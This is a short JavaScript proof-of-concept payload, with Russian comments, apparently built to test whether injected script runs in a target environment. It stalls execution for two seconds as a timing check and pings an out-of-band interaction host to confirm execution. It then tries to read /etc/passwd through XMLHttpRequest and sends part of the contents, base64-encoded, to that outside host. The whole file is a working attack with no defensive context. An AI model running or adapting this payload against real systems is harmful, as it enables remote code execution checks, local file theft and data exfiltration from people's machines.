// payload.js
const hook = "http://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";

// 1. Пытаемся вызвать задержку (DoS/Performance PoC)
const start = Date.now();
while (Date.now() - start < 2000) { /* Синхронный sleep на 2 сек */ }

// 2. Отстук о выполнении скрипта
new Image().src = hook + "/JS_EXECUTED_RCE_CHECK?t=" + start;

// 3. Попытка прочитать локальный файл через XMLHttpRequest (иногда обходит fetch-блокировки)
try {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "file:///etc/passwd", true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            new Image().src = hook + "/LFI_DATA=" + btoa(xhr.responseText).substring(0, 50);
        }
    };
    xhr.send();
} catch(e) {}
